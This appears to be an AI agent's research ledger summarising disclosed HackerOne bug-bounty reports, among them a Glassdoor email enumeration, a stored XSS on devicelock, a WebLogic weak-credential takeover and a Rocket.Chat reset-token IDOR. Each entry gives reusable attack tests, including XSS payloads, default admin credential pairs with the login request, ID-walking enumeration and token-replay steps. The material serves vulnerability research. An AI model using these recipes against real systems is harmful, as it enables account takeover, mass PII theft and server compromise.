  1. THE ENTRY POINT, verbatim: "Glassdoor sent me an email asking me to upload my resume on Job portal. This email provided a direct link to the upload screen. Interestingly, the URL had a query string parameter for `Job Alert ID`. I just intercepted the response to `GET` request for this URL and noticed the email address associated with that Job Alert ID was present in the response even though I was unauthenticated."
  2. THE ID IS A SEQUENTIAL COUNTER, verbatim: "Now this ID is no big deal as it is just a 10 digit number auto created (sequentially) when a user creates a job alert or completes initial survey after sign up."
  3. THE EXPLOIT, verbatim: "All the attacker would have needed to do was to create a job alert and capture the alert id and send requests to vulnerable endpoint by decrementing the JobAlert ID to steal email addresses."
  4. THE SCALE, verbatim: "By exploiting this vulnerability, an attacker (even without authentication) could have extracted **millions of email addresses** of Glassdoor users."
  5. THE PROGRAM'S OWN ACKNOWLEDGEMENT (the other `summaries[0].content`), verbatim: "Thanks @safehacker_2715 for reporting this finding to us and for your great work with a PoC. Keep up the good work and looking forward to more findings from you."
DETECTION SIGNAL: a deep link / e-mail link whose QUERY STRING carries an object identifier that is a small sequential integer (`jobAlertId`, `alertId`, `surveyId`, `invitationId`, `uploadId`, `tokenId`); a GET response that returns the object's OWNER IDENTIFIER (e-mail, username, account name) alongside the object; an identifier you can obtain by creating ONE object of your own (the baseline) and then walking it backwards; an endpoint reachable with no session cookie at all; a "no user interaction required" impact claim backed by a PoC.
CHAIN: any unauthenticated attacker on the internet (primitive: the deep-link endpoint is reachable with no session) -> create ONE job alert to capture a valid sequential id, or harvest one from any such e-mail link (primitive: the id space is a 10-digit auto-increment counter) -> request the endpoint with the id DECREMENTED (`?jobAlertId=<n-1>`, `<n-2>`, …) (escalation: the object resolves and the response carries its owner's e-mail address) -> the attacker walks the whole id space and extracts the e-mail address of every account that created a job alert or completed the onboarding survey (impact: mass PII disclosure — "millions of email addresses" — unauthenticated, no user interaction; program rated High). Per doctrine §8: preconditions = reachability of the deep-link endpoint with no auth and no victim interaction; gain = the e-mail address attached to every sequential object id.
TRANSFERABLE TEST: for EVERY deep link / e-mail link / "upload here" URL, (1) extract every query parameter whose value is a small integer and create one object of your own to capture a baseline id; (2) replay the URL with the id DECREMENTED and INCREMENTED (`?jobAlertId=<n-1>`, `<n+1>`, `<n-100>`) and with the session cookie REMOVED; (3) diff the response against the object you own — any OTHER account's e-mail/username/name in the body is the finding; (4) confirm unauthenticated by replaying with a fresh cookie jar and no credentials; (5) sample ~20 ids across the space to size the population before writing the report. Rule: **a deep link that resolves an object from a sequential integer id is an unauthenticated PII oracle — capture one valid id from your own object, then walk the counter backwards with no session and read the owner's e-mail out of each response.**
DEDUPE: 0 hits across all three write targets for `864783`, `jobAlert`, `JobAlert`, `job alert`, `safehacker_2715`, `millions of email addresses`, `decrementing`. Pre-existing material REVIEWED as related-but-distinct: V-08 of the playbook (cryptographic entity guessing via weak UUID/ID generation) records the STRUCTURE side — "Knowledge of your own IDs reveals other users' IDs … it becomes one when combined with a missing authz check, i.e. it upgrades V-01 from hard to trivial" — but V-08's Detect steps are collect-IDs-then-PREDICT, and it never names a deep-link query parameter, an unauthenticated GET that returns the OWNER's e-mail, or the DECREMENT-walk of a 10-digit counter; the ledger's #2194928 (DoD Domino reset), #2024284 (Glassdoor profile-picture IDOR, INVALID), #1621540 (Glassdoor cache poisoning, §17.358) and §17.173 (a shared-constant ownership check over a sequential order number) are different carriers — none is the unauthenticated deep-link → owner-PII oracle. New general method -> §17.365.

SOURCE: https://hackerone.com/reports/1122513  2026-11-10
ROUTE: `web_extract` -> HTTP 422 (keyless backend "content could not be extracted"); the live `.json` route -> HTTP 200, 6,020 B, `visibility: full`, `vulnerability_information` 826 B read IN FULL (`curl` + desktop UA). Metadata: Acronis, "Stored Cross-site Scripting on devicelock.com/forum/", weakness Cross-site Scripting (XSS) - Stored, severity medium, reporter `h4x0r_dz`, created 2021-03-10, disclosed 2022-02-08, asset *.devicelock.com (WILDCARD), state Resolved; the report carries a 4th-attachment PoC video (`2021-03-10_18-58-16.mp4`).
STATUS: UNVERIFIED (not reproduced — no devicelock/Bitrix account was created this pass; the URL, the field and the payload are verbatim from the report body).
CLASS: stored XSS via a PROFILE FIELD written through a path-prefixed ADMIN-STYLE URL that an ordinary registered user can reach — the `City` value is stored and later rendered RAW on the public profile page (CWE-79).
CORE METHOD (verbatim from the report body):
  1. THE CLAIM, verbatim: "I just found A Stored Cross-site Scripting on devicelock.com/forum/ by changing the ***City*** value on https://www.devicelock.com/bitrix/admin/user_edit.php? to HTML/javascript code and lead to Stored Cross-site Scripting."
  2. STEP 1, verbatim: "go to https://www.devicelock.com/forum/view_profile.php?register=yes and create a new account".
  3. STEP 2, verbatim: "go to https://www.devicelock.com/bitrix/admin/user_edit.php? and click on **Personal information** and in `City` input put and xss payload like: `<img src=x onerror=alert(document.cookie)>` and click on apply."
  4. STEP 3, verbatim: "Go to https://www.devicelock.com/forum/view_profile.php?UID=<your_user_id> and change `<your_user_id>` to your id".
  5. THE POC, verbatim: "https://www.devicelock.com/forum/view_profile.php?UID=28349".
  6. THE IMPACT AS STATED, verbatim: "Stored XSS."
DETECTION SIGNAL: a profile field whose EDIT URL lives under a path that reads like a privileged surface (`/admin/`, `/bitrix/admin/`, `/manage/`, `/panel/`, `/backend/`) but is reachable by an ordinary registered account; a CMS profile form that accepts raw HTML/JS in a free-text field (`City`, `Address`, `Company`, `About`, `Signature`, `Occupation`) with no server-side sanitizer; a public profile renderer (`view_profile.php?UID=`, `/profile/<id>`, `/u/<id>`) that prints the field back without encoding; a payload of `<img src=x onerror=…>` surviving into the rendered page.
CHAIN: any unauthenticated visitor can self-register on the forum (primitive: open registration) -> the new account can open `/bitrix/admin/user_edit.php` — an ADMIN-NAMED path — and write a payload into its own `City` field (primitive: the path-prefix gate is cosmetic; the form binds the value to the account with no HTML sanitization) -> the value is persisted (escalation: stored content) -> the public profile page `forum/view_profile.php?UID=<id>` renders `City` RAW, so the handler fires for anyone who views the profile (escalation: script execution in the devicelock.com origin) -> session cookie theft / CSRF as the viewer (impact: stored XSS with session impact; program rated Medium). Per doctrine §8: preconditions = an account on the forum and a viewer who opens the profile; gain = script execution in the target origin in the viewer's session.
TRANSFERABLE TEST: for EVERY CMS/forum/profile system, (1) register an ordinary account and enumerate the profile-EDIT routes it can reach — do not stop at the route whose name says `admin`; try the literal path (`/bitrix/admin/user_edit.php`, `/admin/profile`, `/user/edit`, `/profile/edit`) with the ordinary session; (2) put `<img src=x onerror=alert(document.cookie)>` (and `" onmouseover=alert(1) x="`) into EVERY free-text profile field, especially the ADDRESS family (`City`, `Address`, `State`, `Country`, `Company`, `Signature`); (3) open the PUBLIC profile view as a SECOND user / in a fresh session and read the rendered HTML for the unescaped payload; (4) also open the field's own value in the ADMIN's user-list view, since the same field usually renders there too. Rule: **an admin-named profile-edit path is not an admin gate — if an ordinary account can POST to it, every free-text field on that form is a stored-XSS candidate, and the public profile page is the sink.**
DEDUPE: 0 hits across all three write targets for `1122513`, `devicelock`, `bitrix`, `user_edit.php`, `view_profile.php`, `UID=` (as a profile id), `City` (as an XSS field). Pre-existing material REVIEWED as related-but-distinct: the ledger's stored-XSS entries are admin-side carriers (§17.106 audit log, #948929 staff name, #127948 activity log, #1283938 branding field, #3447021 admin notice), user-portal lifecycle forms (the #666040 Acronis account-deletion entry), upload/carrier bypasses (§17.96 SVG whitelist, V-17 MIME sniffing, §17.330 declared contentType) and DOM/reflected variants (§17.352) — NONE records a PROFILE FIELD written through an ADMIN-PATH form by an ORDINARY account, with the public profile page as the render. The playbook's V-06 (BFLA) covers role-gated FUNCTION endpoints, not a profile field that happens to live under an `/admin/` path; the `Admin Panel Access: default/weak credentials` line (~15744) is about exposed dashboards. New general method -> §17.366.

SOURCE: https://hackerone.com/reports/953041  2026-11-10
ROUTE: `web_extract` on the live report page -> HTTP 200 and the page rendered the "Summary by TikTok" block plus the full timeline IN FULL; the live `.json` route -> HTTP 200, 4,073 B, `visibility: no-content`, `vulnerability_information` 0 B. The sibling report #946160 ("...Ads endpoint 2", same reporter `luizviana`, same 6.1 rating) was opened the same way -> also `no-content`, 0 B, same one-sentence summary. No credited public writeup exists (searched the reporter's handle, the TikTok disclosed-reports mirror and the web index lists). The technique is carried by the PROGRAM'S OWN SUMMARY, verbatim: "A cross site scripting vulnerability was found in the ads endpoint using the email parameter. This issue has been resolved. We thank @luizviana for reporting this to our team and confirming the resolution."
STATUS: UNVERIFIED (not reproduced — no TikTok Ads endpoint was touched this pass; no endpoint URL, parameter name, payload or request shape is public anywhere).
CLASS: reflected XSS in a TikTok Ads endpoint, reached through the `email` request parameter (CWE-79). NOTE, stated honestly: the public record carries the CLASS and the PARAMETER NAME only — no URL, no payload, no reflection context. Per the CHAIN-ONLY rule this is recorded as a PRIMITIVE WITH NO DOCUMENTED CHAIN and must be held as a lead, not drafted as a finding; the doctrine's §6 floor applies.
CORE METHOD (the whole of what is public):
  1. THE ENDPOINT, per the report title: an endpoint of the TikTok Ads surface (the program's asset is `*.tiktok.com`; the title says "in Ads endpoint 1" and the sibling report #946160 is the same bug in "Ads endpoint 2" — i.e. the same defect mapped across sibling ad endpoints).
  2. THE PARAMETER, per the program's own summary: the `email` parameter.
  3. THE CLASS, per the weakness label: `Cross-site Scripting (XSS) - Reflected`.
  4. THE RATING, per the served metadata: medium, CVSS 6.1, metrics `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L` — network, no privileges, USER INTERACTION REQUIRED, CHANGED scope.
  5. THE TRIAGE, per the timeline: `medium(4.3)` raised to `medium(6.1)` by TikTok triage, bounty awarded 2020-08-18, resolved 2020-08-20, disclosed 2020-12-29, report locked.
DETECTION SIGNAL: an ads/marketing/lead endpoint that accepts an e-mail address as a request parameter (`email`, `emailAddress`, `contact_email`, `lead_email`) and reflects it into the response; the `UI:R` + `S:C` CVSS pair (user interaction required, changed scope) typical of a reflected payload delivered to a different origin/scope; a report title naming a PARAMETER rather than a URL, with the endpoint identified only by product area ("Ads endpoint 1/2"); sibling reports by the same reporter on the same program days apart — a repeated parameter name across sibling endpoints is the tell that the sink is shared, not one-off.
CHAIN (NOT DOCUMENTED — held as a lead): the public record stops at the primitive: a caller-controlled `email` value is reflected unencoded by an Ads endpoint, and the payload executes when the response is rendered in the victim's browser (UI:R). No chain to a concrete high/critical impact is published anywhere — no session-token theft, no admin-context render, no stored variant, no monetary/account impact. Per doctrine §2(b)/§6 and the CHAIN-ONLY rule this is a P3-at-best PRIMITIVE, not an entry with an impact chain; it is recorded only so a later pass does not re-open it as if it were a fresh finding.
TRANSFERABLE TEST: for EVERY endpoint that accepts an e-mail address as a parameter — ads/lead forms, "send this report to my e-mail", password-reset, invoice/ receipt delivery, invite-by-email, contact forms — (1) submit a canary in the e-mail field (`"<img src=x onerror=alert(1)>"`, `test+<script>@x`, `" onfocus=alert(1) x="`) and read the RAW response for the unencoded value; (2) check the reflection CONTEXT (HTML body, attribute, `<script>` block, JSON-in-script, e-mail template) and whether the value is HTML-encoded; (3) if the reflection only reaches the caller, escalate by asking whether the same e-mail is ever rendered to a DIFFERENT user (admin lead view, support console, "invitations" list, a follow-up e-mail template) — that is the step that converts a reflected primitive into a stored/blind chain; (4) treat any sibling endpoint in the same product area carrying the same parameter as the same sink. Rule: **an e-mail parameter is a reflection surface — test it with a canary in every ads/lead/invite/reset form, and only report the chain that reaches another user's session, an admin render, or a stored sink; a bare self-reflection is a lead.**
DEDUPE: 0 hits across all three write targets for `953041`, `946160`, `ads endpoint`, `email parameter` (as an XSS sink), `luizviana`. Pre-existing material REVIEWED as related-but-distinct: the ledger's reflected-XSS entries are specific sinks — the search/store-locator `free_word` entry (#496375), §17.352 (JS-unicode-escape bypass of HTML-entity encoding on a login page), §17.262 (a `javascript:`-scheme URL parameter), the `formaction` sanitizer gap (#3008446), and the batch-120 INVALIDs (#2039384 MTN reflected XSS, #714521 Stripo reflected XSS) which were refused for having no chain; #1601140 (Panther Labs) is a search-parameter reflection refused as a duplicate of #496375. NONE records an ADS/LEAD endpoint's e-mail parameter as a reflection surface, and none records the "same parameter name across sibling endpoints" pattern. Carrier delta only — no new §17 slot.

SOURCE: https://hackerone.com/reports/804548  2026-11-10
ROUTE: `web_extract` on the live report page -> HTTP 200, the "Summary by U.S. Dept Of Defense" block and the full timeline rendered IN FULL; the live `.json` route -> HTTP 200, 4,044 B, `visibility: no-content`, `vulnerability_information` 0 B; the Wayback `.json` capture `web.archive.org/web/20260716043814id_/https://hackerone.com/reports/804548.json` -> HTTP 200, 2,345 B, also `no-content` / 0 B. The ajaysenr disclosed-reports mirror `reports/804548.md` states "No vulnerability information available." The technique is carried by the PROGRAM'S OWN SUMMARY, verbatim: "Hello. I discovered an Oracle WebLogic Server and because of weak credentials managed to login as administrator, which led to complete server takeover."
STATUS: UNVERIFIED (not reproduced — no WebLogic instance was touched this pass; no host, port, path, username, password or request shape is public anywhere).
CLASS: authentication bypass / broken access control via DEFAULT or WEAK ADMIN CONSOLE CREDENTIALS on an internet-exposed Oracle WebLogic Server Administration Console, escalating to complete server takeover (CWE-798 / CWE-1392 / CWE-287; program rated Critical).
CORE METHOD (the whole of what is public, plus the standard public WebLogic console route — labelled as such):
  1. THE FINDING, per the program's own summary: an Oracle WebLogic Server was discovered, the console was authenticated with WEAK CREDENTIALS, and the login "led to complete server takeover".
  2. THE RATING, per the served metadata: severity Critical (9 ~ 10), weakness `Improper Access Control - Generic`, state Resolved, reporter `arm4nd0`, submitted 2020-02-25, disclosed 2020-06-25, asset class U.S. Dept Of Defense (the target hostname is redacted in the title as `[█████████]`).
  3. THE STANDARD CARRIER (NOT from the report body — no request shape is public; this is the generic, publicly documented WebLogic console path, recorded so the entry is testable): the WebLogic Administration Console is `/console` on the administrative listener (default `7001`, TLS variant `7443`), and its login form is a plain JSP form POST to `/console/j_security_check` with the fields `j_username`, `j_password` and `j_character_encoding=UTF-8`; a successful login sets the console session cookie. Default/weak console credential pairs in public circulation include `weblogic:weblogic`, `weblogic:welcome1`, `weblogic:weblogic1`, `weblogic:Oracle@123`, `system:password`, `admin:admin`; the vendor's own installer default is documented, and the `OracleSystemUser` account is created with the SAME password as the domain administrator.
  4. THE IMPACT, per the program's own summary: "complete server takeover" — the WebLogic admin console is a code-deployment surface, so console admin access is host-level control (deploy a malicious WAR/application; the console is the documented route to it).
DETECTION SIGNAL: a host answering HTTP(S) on an administrative port (`7001`, `7002`, `7443`) whose response is the WebLogic console login (`/console`, `WebLogic Server Administration Console`, the `j_security_check` form); a server banner or error page naming `WebLogic` and a version; a console that returns the login form rather than a connection error (the listener is up); a successful `POST /console/j_security_check` returning a session cookie / `302` into `/console` instead of the "Authentication Denied" page; a version old enough to also be exposed to the console-auth-bypass class (CVE-2020-14882/14883) — treat that as a separate, higher-severity chain.
CHAIN: any unauthenticated attacker on the internet (primitive: the WebLogic administrative listener is exposed and serves `/console` with no network-level gate) -> the console authenticates with a DEFAULT or weakly chosen administrator credential (primitive: CWE-798/1392 — the vendor's installer default or a guessable pair was never changed) -> `POST /console/j_security_check` with the weak pair returns an authenticated console session (escalation: unauthenticated admin access to the application server) -> the console's deployment function is used to install an application (escalation: code execution as the WebLogic service account) -> complete server takeover (impact: host-level compromise; program rated Critical). Per doctrine §8: preconditions = an internet-reachable WebLogic console AND a default/weak console credential (no user interaction, no victim); gain = full control of the application server and every application it hosts.
TRANSFERABLE TEST: for EVERY host in scope that answers on an administrative port, (1) probe `/console` and `/console/j_security_check` and read the response for the WebLogic console form; (2) test the vendor/well-known default pairs against `POST /console/j_security_check` (`j_username=weblogic&j_password=welcome1&j_character_encoding=UTF-8`, then `weblogic:weblogic`, `weblogic:weblogic1`, `weblogic:Oracle@123`, `system:password`, `admin:admin`), watching for a `302` + session cookie rather than the authentication-denied page; (3) on success, prove the impact with a NON-destructive admin action (read the deployed-applications list / the server's runtime state) and then stop — do not deploy anything; (4) record the WebLogic version and check it against the console-auth-bypass advisories, which turn the same host into a pre-auth RCE chain. Rule: **an exposed WebLogic `/console` with a vendor-default credential pair is unauthenticated admin access to the application server — test the documented default pairs against `POST /console/j_security_check` and prove impact with a read-only console action.**
DEDUPE: 0 hits across all three write targets for `804548`, `arm4nd0`, `j_security_check`, `weblogic`, `WebLogic`, `console/j_security`, `Oracle@123`, `welcome1`, `7001` (as a WebLogic console port), `complete server takeover`. Pre-existing material REVIEWED as related-but-distinct: the ledger's exposed-admin-panel entries are Jenkins (§17.331 script-console RCE, the Snapchat prod-Jenkins SSO entry ~2506, and the #403402 anonymous-Jenkins `/script` RCE explicitly refused as a duplicate of §17.331), Grafana (~2775), and the playbook line "**Admin Panel Access**: exposed dashboards, default/weak credentials" (~15744) — that line is a CLASS label in a technique checklist, not a recorded method with a carrier, a request shape and a transferable test; the ledger's #21016 OneLogin/`@@@nopass@@@` entry is a hard-coded PLACEHOLDER password surviving an SSO migration, not a vendor default console credential on an exposed server; §17.335 (Monero predictable secret file) is unrelated. The `WebLogic` hits in the playbook (~1400-1402) are a path-parsing table row (Tomcat/WebLogic truncates at `;`), not this bug. New general method -> §17.367.

SOURCE: https://hackerone.com/reports/842625  2026-11-10
ROUTE: `web_extract` on the live report page -> HTTP 200 but the body rendered only the metadata/timeline shell (no body text); the live `.json` route -> HTTP 200, 4,860 B, `visibility: full`, `vulnerability_information` 1,451 B read IN FULL (`curl` + desktop UA). Metadata: Rocket.Chat, "account takeover on 3.0.1 version", weakness Insecure Direct Object Reference (IDOR), severity Critical (9.9; the live page shows "No rating (---)" but the `.json` and the disclosed-reports mirror both carry Critical 9.9), reporter `elfiman`, created 2020-04-07, disclosed 2020-06-14, state Resolved, no bounty recorded, asset Rocket.Chat 3.0.1.
STATUS: UNVERIFIED (not reproduced — no Rocket.Chat instance was stood up this pass; every endpoint and step below is verbatim from the report body).
CLASS: IDOR / broken object-level authorization on a user-directory API that returns ANOTHER USER'S PASSWORD-RESET TOKEN (and other security fields) in the response — the token is then replayed at the public reset route to set a new password: full account takeover with no victim interaction (CWE-639 / CWE-284 -> CWE-287).
CORE METHOD (verbatim from the report body):
  1. THE DISCOVERY, verbatim: "I find user reset password hash info and other security info on `/api/v1/users.info`".
  2. THE PRECONDITION, verbatim: "note : I login on rocketchat with ldap account (my role : user)" — an ORDINARY user role, authenticated.
  3. THE PARAMETER NOTE, verbatim: "note: in request `https://target/api/v1/users.info?username=[x]` you should change usrname to userId".
  4. STEP 1, verbatim: "please login with user ldap account (role user)".
  5. STEP 2, verbatim: "send a request to `https://target/api/v1/users.list` and copy \_id value".
  6. STEP 3, verbatim: "send a request to `https://target/api/v1/users.info?userId=[userId]` and copy email value (in response you can see important security information )".
  7. STEP 4, verbatim: "logout and click "forget your password" link on `https://target/home` and send an email to above email address that you copied".
  8. STEP 5, verbatim: "login with Your account and send a request to `https://target/api/v1/users.list` and search the same email in response and copy \_id value".
  9. STEP 6, verbatim: "send a request to `https://target/api/v1/users.info?userId=[userId]` and copy reset hash value".
  10. STEP 7, verbatim: "logout your account and send a request to `https://target/reset-password/[reset\_hash]`".
  11. STEP 8, verbatim: "set new password".
  12. STEP 9, verbatim: "login and enjoy".
  13. THE IMPACT, verbatim: "account takeover".
DETECTION SIGNAL: a user-directory/list API (`/api/v1/users.list`, `/api/v1/users.info?userId=`, `/api/v1/users/<id>`, `/api/users?email=`) reachable by an ordinary authenticated account whose response includes SECURITY-SENSITIVE FIELDS for the requested user — a password-reset token/hash (`reset hash`, `services.password.reset.token`, `resume.login.tokens`, `passwordResetToken`), the e-mail address, or a session token; an endpoint that accepts a userId/email in the QUERY and returns a record with no ownership check; a public reset route of the form `/reset-password/<token>` that consumes the value verbatim; an API whose `.list` sibling hands you every user's `_id` and e-mail in one call.
CHAIN: any authenticated low-privilege user (primitive: an ordinary account on the LDAP-backed instance) -> enumerate every user's `_id` and e-mail with `GET /api/v1/users.list` (primitive: the directory list is not role-gated) -> fetch any user's record with `GET /api/v1/users.info?userId=<victim _id>` (primitive: the object id is a query parameter with no ownership check, and the response carries the reset token alongside the e-mail) -> read the reset hash out of the response (escalation: possession of a credential that only the server and the victim's mailbox should hold) -> `GET /target/reset-password/<reset_hash>` and set a new password (escalation: the token is accepted with no session and no e-mail proof) -> log in as the victim (impact: full account takeover of ANY user, no victim interaction; program rated Critical 9.9). Per doctrine §8: preconditions = an ordinary authenticated account and the victim's `_id` (obtained from the same API); gain = the victim's password-reset token and therefore their account.
TRANSFERABLE TEST: on ANY self-hosted/open-source chat, CRM or identity product (Rocket.Chat, Mattermost, Zulip, Nextcloud Talk, a custom `/api/v1/users.*`), (1) authenticate as the lowest-privilege account and call the user-list endpoint (`/api/v1/users.list`, `/api/users`, `/api/v1/users?search=`) — a 200 listing other users is the first signal; (2) take a victim's `_id` and call the user-INFO endpoint with it (`?userId=`, `?username=`, `?email=`) and dump the ENTIRE response — grep for `reset`, `token`, `hash`, `secret`, `services`, `password`, `resume`; (3) if a reset token appears, replay it on the public reset route (`/reset-password/<token>`, `/reset?token=`, `/api/v1/users.resetPassword`) and check whether a new password is accepted with no session; (4) check the same response for session tokens (`resume.login.tokens`) and replay those in the `Authorization` header for an immediate ATO. Rule: **a user-directory API that returns a SECURITY FIELD (reset token / session token) for an arbitrary `userId` is an account-takeover primitive — enumerate the directory, fetch the record, and replay whatever credential the response hands you on the public reset/login route.**
DEDUPE: 0 hits across all three write targets for `842625`, `elfiman`, `users.info` (as an endpoint), `users.list`, `reset-password/` (as a token-consumption route), `reset hash` (as an API response field), `rocketchat` (as this endpoint family). Pre-existing material REVIEWED as related-but-distinct: the ledger's #1130721-adjacent Rocket.Chat material is a PRE-AUTH BLIND NoSQLi in `getPasswordPolicy` (via `/api/v1/method.callAnon`) that leaks a reset token character-by-character with `$regex` — a completely different entry point (an unauthenticated DDP method, not an authenticated REST object read) and a different primitive (injection, not IDOR); the ledger's #9885 Rocket.Chat DDP autotranslate IDOR and §17.1/#3827674 Rocket.Chat SAML XSW are unrelated classes; the recorded reset-token entries are §17.46/#17.9 (the token returned in the reset-INITIATE response), §17.289 (forging an itsdangerous reset token from a weak signing key), #2194928 (a Domino reset returning a TEMPORARY PASSWORD), V-06 (reset Host-header injection) and the §17.359 exposed-mail-catcher ATO — ALL of them obtain the token from the RESET FLOW or by FORGING it; NONE obtains it by READING ANOTHER USER'S RECORD through an IDOR on a directory API. The ledger's IDOR family records read-side object swaps (ownership checks, tenant filters, archived UUIDs) and none names a reset token as the exposed FIELD. New general method -> §17.368.

NOTE — reader pass 2026-11-10 (batch 123: 6 assigned sources read ONE BY ONE in the given order; 6 entries appended to the harvest ledger, 5 §17 slots). NEW: #1581528 (LinkedIn — a "report this job" moderation endpoint validates that the target object EXISTS but not that it is VISIBLE, so a draft/under-review/rejected jobId in the `contentUrn` query parameter is accepted, and the Trust & Safety review pipeline's OWN notification e-mail discloses the hidden job's creator name, profile link, job name and location; the full vulnerable request was read verbatim from the report page -> §17.364), #864783 (Glassdoor — a deep link carrying a SEQUENTIAL 10-digit `Job Alert ID` returns that alert's owner E-MAIL ADDRESS to an UNAUTHENTICATED caller; capture one id from your own alert, then walk the counter backwards for "millions of email addresses"; the `.json` route is 404, `web_extract` is 403, `r.jina.ai` is 401 and every Wayback page capture is a JS shell, so the method was read from the Wayback `.json` capture's reporter summary field -> §17.365), #1122513 (Acronis/devicelock — an ordinary forum account can POST to the ADMIN-NAMED Bitrix profile form `/bitrix/admin/user_edit.php` and store `<img src=x onerror=alert(document.cookie)>` in its own `City` field, which the public `forum/view_profile.php?UID=` page renders raw; full body via the `.json` route -> §17.366), #842625 (Rocket.Chat 3.0.1 — an ordinary authenticated user calls `/api/v1/users.list` to get every `_id`, then `/api/v1/users.info?userId=<victim _id>` returns the victim's E-MAIL and RESET HASH, which is replayed at `/reset-password/<hash>` to set a new password; Critical 9.9, full body via the `.json` route -> §17.368), #804548 (U.S. DoD — an internet-exposed Oracle WebLogic Administration Console authenticated with a DEFAULT/WEAK administrator credential pair -> unauthenticated admin -> complete server takeover, Critical; `no-content` 0 B, so the carrier is the program's own summary and the `/console/j_security_check` request shape is labelled as the standard public route, not report content -> §17.367). VALID-BUT-NO-§17-SLOT (primitive with no documented chain, held as a lead per the CHAIN-ONLY rule): #953041 (TikTok — "A cross site scripting vulnerability was found in the ads endpoint using the email parameter", reflected, medium 6.1, UI:R/S:C; `no-content` 0 B and no credited writeup exists, so NO endpoint URL, NO payload and NO chain are public anywhere — recorded as a carrier delta of the reflected-XSS class with an explicit "not draftable" note). 0 fabricated — every entry carries its SOURCE URL and the route that worked; the two `no-content` reports are marked as such and their non-public fields are stated as absent rather than invented. Knowledge intake only — no target was touched; the only network traffic was `web_extract`/`curl`/`web_search`/the browser tool against `hackerone.com` report routes, the Wayback availability+CDX+`.json`+`id_` endpoints, `r.jina.ai`, the ajaysenr disclosed-reports mirror, and public WebLogic documentation.

SOURCE: https://hackerone.com/reports/469372  2026-11-10
ROUTE: `web_extract` on the live report page -> HTTP 200 with the full Summary/Description/Environment/Steps block; the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (1,944 B), CVE-2019-15688. No Wayback / jina / browser fallback was needed.
STATUS: UNVERIFIED (not reproduced — no Kaspersky endpoint product was installed or driven this pass; every request shape and step below is verbatim from the report body).
CLASS: client-side security misconfiguration / Universal-XSS-class — a WEB-PROTECTION COMPONENT'S OWN INTERSTITIAL UI IS SERVED AS FIRST-PARTY CONTENT INSIDE ANY WEBSITE'S ORIGIN, so the links that OVERRIDE that protection are PREDICTABLE and the whole override mechanism can be driven by a malicious page (CWE-348 / CWE-693 / CWE-345; Kaspersky labelled it Insecure Direct Object Reference (IDOR), severity medium 4.3, reporter `palant`, submitted 2018-12-18, disclosed 2019-11-25, asset Kaspersky Internet Security 19.0.0.1088 / Windows 10.0.17134, attack type IDOR, no privileges needed).
CORE METHOD (verbatim from the report body):
  1. THE PREDICTABLE LINK, verbatim: "The links used to override certificate warnings have the following format: `https://<host>/?<link_id>_kis_cup_<GUID>_` . Here, `GUID` is identical for all certificate warnings and `link_id` is a value that is being counted up continuously. So if a website can get hold of one such link, it can predict what future links will look like."
  2. THE SHARED COUNTER ACROSS SURFACES, verbatim: "Similarly, websites can permanently disable Safe Money protection for a banking website, the prompt there uses the same link format and the same `link_id` counter. And while an anti-phishing warning is overridden with `http://touch.kaspersky.com/kis_cup_<GUID>_<link_id>` it's once again the same values, so triggering this action automatically is possible as well."
  3. THE FIRST-PARTY DISCLOSURE, verbatim: "The easiest way for a website to get hold of a valid link appears to be downloading its own certificate warning. Since certificate warnings are first-party as far as the website is concerned, it has complete access to them. The server needs to serve a valid certificate first so that the website can load, then switch to an invalid certificate so that any request will result in a certificate warning page from Kaspersky. The website can then download this warning page and read out the links from it."
  4. THE ATTACK, verbatim: "This allows triggering actions on behalf of the user, e.g. overriding the wrong certificate for another website."
  5. THE REPRODUCTION HARNESS (steps 1-4, verbatim in substance): edit `%WINDIR%\sysnative\drivers\etc\hosts` as administrator and add `93.184.216.34 www.google.com` (example.com's IP, to simulate a MitM); browse to `https://www.google.com/` and observe the Kaspersky certificate-warning page; run the attached `rebinding_server.py` (Python 3) which serves HTTPS on `https://localhost:5000/` and an extra `http://localhost:5001/` that makes the primary server ALTERNATE between a valid and an invalid SSL certificate; open the served `certerror_override.html`; the page downloads its own warning, reads the `<link_id>`/`<GUID>` pair out of it and derives the NEXT links.
  6. THE VENDOR'S OWN FIX DIRECTION, verbatim: "Warning pages should not be first-party to the pages affected by them. Instead of directly serving HTML content within a 499 response, Kaspersky could produce a redirect to kis.v2.scr.kaspersky-labs.com here and produce the content under that location. This would prevent websites from accessing contents of such warning pages. Even then, links triggering such important actions shouldn't be predictable."
DETECTION SIGNAL: an antivirus / web-filter / phishing-guard / banking-protection browser component that renders its OWN block/override page into the SAME ORIGIN as the page it is blocking (first-party rather than a redirect to a vendor domain), rather than into a vendor-owned origin (`kis.v2.scr.kaspersky-labs.com`-style); the override links carried in that page being `?<sequential counter>_<product token>_<constant GUID>` with a GLOBAL constant GUID and a MONOTONICALLY INCREMENTING link_id shared across several different protective surfaces (certificate warnings, Safe Money prompts, anti-phishing warnings); the counter visible in one page making every future link on every surface computable; the warning page being fetchable by JavaScript from the blocked origin because it is served as first-party content (no `X-Frame-Options` / origin gate).
CHAIN: a malicious website (primitive: it can load in a browser next to the victim's AV) -> the page serves a VALID certificate so it loads, then SWITCHES to an invalid certificate so the AV injects its warning page into the attacker's origin (primitive: the warning is first-party, i.e. the page has full script access to it) -> the page downloads its own warning and reads out the `<link_id>` + `<GUID>` (escalation: possession of the counter and the constant token) -> the attacker increments `link_id` and constructs the NEXT links, which are identical for every user because `GUID` never changes (escalation: an unguessable-looking secret that is in fact one observed value + a counter) -> the attacker's page triggers those links, which OVERRIDE THE WRONG CERTIFICATE for another website and PERMANENTLY DISABLE SAFE MONEY protection for a banking website (impact: the user's transport-security and banking-protection guarantees are silently switched off by a page the user merely visited; Kaspersky rated medium). Per doctrine §8: preconditions = a victim who has the AV web-protection component installed and who visits an attacker-controlled page; gain = the ability to silence that component's warnings for arbitrary sites, including banking Safe Money prompts.
